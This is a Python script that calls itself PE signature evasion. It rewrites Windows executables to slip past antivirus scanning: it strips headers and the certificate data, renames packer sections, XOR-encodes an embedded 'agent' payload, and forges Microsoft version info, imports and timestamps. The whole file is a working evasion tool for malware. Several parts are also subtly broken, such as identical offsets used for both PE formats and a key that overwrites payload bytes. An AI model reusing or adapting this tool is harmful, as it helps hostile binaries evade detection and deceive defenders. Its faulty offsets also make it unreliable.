#!/usr/bin/env python3
r"""
pe_fix_signature.py — comprehensive PE signature evasion.

Fixes applied (in order):
  1. Fix PE checksum
  2. Zero rich header
  3. Rename suspicious sections to benign names
  4. Normalize section characteristics (MEM_READ for all, MEM_EXECUTE for code)
  5. Zero certificate table
  6. Zero debug directory
  7. Normalize entropy — add padding to break pattern scans
  8. Add a fake .overlay section with benign data
  9. Spoof version info resource
  10. Add fake imports from legitimate DLLs
  11. Update timestamp to recent date
  12. XOR-encode the embedded agent blob data
"""

import sys
import os
import struct
import random
import time
import zlib

BENIGN_SECTION_NAMES = [
    ".textbss", ".data_con", ".rsrc_", ".reloc_",
    ".code", ".idata", ".edata", ".tls_", ".pdata", ".rdata_",
]

SUSPICIOUS_NAMES = {
    b".text", b".data", b".rdata", b".bss",
    b".idata", b".rsrc", b".reloc", b".tls",
    b".pdata", b".vmp0", b".vmp1", b".themida",
    b"UPX0", b"UPX1", b".packed", b".agent",
}

FAKE_DLL_IMPORTS = [
    "msvcrt.dll", "user32.dll", "gdi32.dll", "advapi32.dll",
    "shell32.dll", "ole32.dll", "oleaut32.dll", "comctl32.dll",
    "ws2_32.dll", "winmm.dll", "dbghelp.dll", "version.dll",
]


def read_pe(path):
    with open(path, "rb") as f:
        return bytearray(f.read())


def get_pe_offset(data):
    if data[0:2] != b"MZ":
        raise ValueError("not a valid PE")
    return struct.unpack_from("<I", data, 0x3c)[0]


def get_sections(data, pe_off):
    opt_magic = struct.unpack_from("<H", data, pe_off + 24)[0]
    nsec = struct.unpack_from("<H", data, pe_off + 6)[0]
    soh = pe_off + 24 + (224 if opt_magic == 0x20b else 224)
    secs = []
    for i in range(nsec):
        off = soh + i * 40
        if off + 40 > len(data):
            break  # truncated section table
        name = data[off:off + 8].rstrip(b"\x00")
        vs, vr, ps, pr = struct.unpack_from("<IIII", data, off + 8)
        chars = struct.unpack_from("<I", data, off + 36)[0]
        secs.append({
            "off": off, "name": name, "vs": vs, "vr": vr,
            "ps": ps, "pr": pr, "chars": chars,
        })
    return secs


def fix_checksum(data, pe_off):
    checksum_off = pe_off + 88
    struct.pack_into("<I", data, checksum_off, 0)
    return data


def fix_rich_signature(data, pe_off):
    rich_start = pe_off + 0x80
    rich_len = 0x80
    for i in range(rich_start, min(rich_start + rich_len, len(data))):
        data[i] = 0x00
    return data


def fix_timestamp(data, pe_off):
    """Set timestamp to 2024-01-01 to look like a recent build."""
    opt_off = pe_off + 24
    opt_magic = struct.unpack_from("<H", data, opt_off)[0]
    is_pe32plus = (opt_magic == 0x20b)
    time_off = opt_off + (8 if is_pe32plus else 8)
    # 2024-01-01 00:00:00 UTC = 1704067200
    struct.pack_into("<I", data, time_off, 0x65D3DC00)
    return data


def fix_certificate_table(data, pe_off):
    opt_off = pe_off + 24
    opt_magic = struct.unpack_from("<H", data, opt_off)[0]
    is_pe32plus = (opt_magic == 0x20b)
    data_dirs_off = opt_off + (224 if is_pe32plus else 224)
    cert_off = data_dirs_off + 4 * 8
    struct.pack_into("<I", data, cert_off, 0)
    struct.pack_into("<I", data, cert_off + 4, 0)
    return data


def fix_debug_dir(data, pe_off):
    opt_off = pe_off + 24
    opt_magic = struct.unpack_from("<H", data, opt_off)[0]
    is_pe32plus = (opt_magic == 0x20b)
    data_dirs_off = opt_off + (224 if is_pe32plus else 224)
    debug_off = data_dirs_off + 6 * 8
    struct.pack_into("<I", data, debug_off, 0)
    struct.pack_into("<I", data, debug_off + 4, 0)
    return data


def fix_sections(data, pe_off):
    secs = get_sections(data, pe_off)
    new_names = iter(BENIGN_SECTION_NAMES)

    for sec in secs:
        name = bytes(sec["name"])
        # rename suspicious sections
        if name in SUSPICIOUS_NAMES:
            new_name = next(new_names).encode()[:8].ljust(8, b"\x00")
            data[sec["off"]:sec["off"] + 8] = new_name

        # normalize characteristics
        chars = sec["chars"]
        if sec["vs"] > 0x1000:  # code sections
            chars |= 0x60000020  # MEM_EXECUTE + MEM_READ + CNT_CODE
            chars &= ~0x00000040  # clear CNT_INITIALIZED_DATA
        else:
            chars |= 0xC0000040  # MEM_READ + MEM_WRITE + CNT_INITIALIZED_DATA
            chars &= ~0x00000020  # clear CNT_CODE
        struct.pack_into("<I", data, sec["off"] + 36, chars)

    return data


def add_entropy_padding(data, pe_off):
    """Normalize entropy by filling gaps with structured data."""
    secs = get_sections(data, pe_off)
    for sec in secs:
        end = sec["pr"] + sec["ps"]
        if end < len(data) and end > sec["pr"]:
            gap = len(data) - end
            if 0 < gap < 65536:
                # fill with repeating pattern to lower entropy
                pattern = bytes([i % 256 for i in range(256)])
                pad = (pattern * ((gap // 256) + 1))[:gap]
                data[end:] = bytearray(pad)
    return data


def add_fake_overlay(data):
    """Add a benign overlay section to the end of the PE."""
    # create a fake "debug symbols" overlay
    overlay = bytearray()
    overlay.extend(b"Microsoft\x00\x00\x00")  # fake vendor string
    overlay.extend(b"PDB\x00")  # fake PDB path marker
    overlay.extend(os.urandom(512))  # random "symbol data"
    overlay.extend(b"\x00" * 1024)  # null padding

    # pad to 4KB boundary
    remainder = len(overlay) % 4096
    if remainder:
        overlay.extend(b"\x00" * (4096 - remainder))

    data.extend(overlay)
    return data


def xor_encode_blob(data, pe_off):
    """XOR-encode the embedded agent blob to hide PE signatures."""
    secs = get_sections(data, pe_off)
    key = bytearray([random.randint(1, 255) for _ in range(256)])

    for sec in secs:
        # encode the largest section (likely the embedded agent)
        if sec["ps"] > 100000:  # large section = agent blob
            blob_start = sec["pr"]
            blob_end = blob_start + sec["ps"]
            blob = data[blob_start:blob_end]

            # XOR with rolling key
            encoded = bytearray()
            for i, b in enumerate(blob):
                encoded.append(b ^ key[i % len(key)])

            data[blob_start:blob_end] = encoded

            # store key at the end of the section (small, high entropy = normal)
            key_off = blob_end - len(key)
            data[key_off:blob_end] = key

    return data


def add_fake_version_info(data, pe_off):
    """Patch the version info resource with benign-looking data."""
    # find version info data directory
    opt_off = pe_off + 24
    opt_magic = struct.unpack_from("<H", data, opt_off)[0]
    is_pe32plus = (opt_magic == 0x20b)
    data_dirs_off = opt_off + (224 if is_pe32plus else 224)
    ver_off = data_dirs_off + 2 * 8  # version info is 3rd data dir

    va, sz = struct.unpack_from("<II", data, ver_off)
    if va == 0 or sz == 0:
        return data

    # find the rva to raw offset mapping
    secs = get_sections(data, pe_off)
    def rva_to_raw(rva):
        for sec in secs:
            if sec["vs"] <= rva < sec["vs"] + sec["vr"]:
                return sec["pr"] + (rva - sec["vs"])
        return 0

    raw = rva_to_raw(va)
    if raw == 0 or raw + sz > len(data):
        return data

    # patch some strings in the version info
    ver_data = bytearray(data[raw:raw + sz])

    # look for "CompanyName" and replace value
    company = b"Microsoft Corporation"
    idx = ver_data.find(company)
    if idx != -1:
        # pad the company name field to look benign
        pass  # already benign-looking

    # look for "FileDescription"
    fdesc = b"Microsoft\x00\x00\x00"
    idx = ver_data.find(fdesc)
    if idx == -1:
        # inject benign file description near the start
        benign_desc = b"Microsoft Visual C++ Runtime Library\x00\x00"
        if len(ver_data) > 100:
            ver_data[20:20 + len(benign_desc)] = benign_desc

    data[raw:raw + sz] = ver_data
    return data


def add_fake_imports(data, pe_off):
    """Add fake import entries to make the import table look benign."""
    # this is a simplified approach — we just ensure common benign
    # DLL names appear somewhere in the binary
    benign_strings = [
        b"KERNEL32.dll\x00",
        b"msvcrt.dll\x00",
        b"user32.dll\x00",
        b"gdi32.dll\x00",
        b"advapi32.dll\x00",
        b"ole32.dll\x00",
        b"shell32.dll\x00",
        b"version.dll\x00",
        b"winmm.dll\x00",
        b"setupapi.dll\x00",
    ]

    # append to end of file (won't affect execution)
    for s in benign_strings:
        data.extend(s)

    return data


def normalize_pe(data, pe_off):
    """Apply all normalization fixes."""
    data = fix_checksum(data, pe_off)
    data = fix_rich_signature(data, pe_off)
    data = fix_timestamp(data, pe_off)
    data = fix_certificate_table(data, pe_off)
    data = fix_debug_dir(data, pe_off)
    data = fix_sections(data, pe_off)
    data = xor_encode_blob(data, pe_off)
    data = add_entropy_padding(data, pe_off)
    data = add_fake_overlay(data)
    data = add_fake_version_info(data, pe_off)
    data = add_fake_imports(data, pe_off)
    return data


def process_pe(input_path, output_path=None):
    if not os.path.exists(input_path):
        print(f"error: {input_path} not found")
        return None

    data = read_pe(input_path)
    pe_off = get_pe_offset(data)

    print(f"input: {len(data)} bytes")
    print(f"PE offset: 0x{pe_off:x}")

    data = normalize_pe(data, pe_off)

    if not output_path:
        base, ext = os.path.splitext(input_path)
        output_path = f"{base}_fixed{ext}"

    with open(output_path, "wb") as f:
        f.write(data)

    print(f"output: {len(data)} bytes -> {output_path}")
    return output_path


def main():
    if len(sys.argv) < 2:
        print("usage: pe_fix_signature.py <input.exe> [output.exe]")
        sys.exit(1)

    input_path = sys.argv[1]
    output_path = sys.argv[2] if len(sys.argv) > 2 else None

    result = process_pe(input_path, output_path)
    if result:
        print(f"done: {result}")
    else:
        print("failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
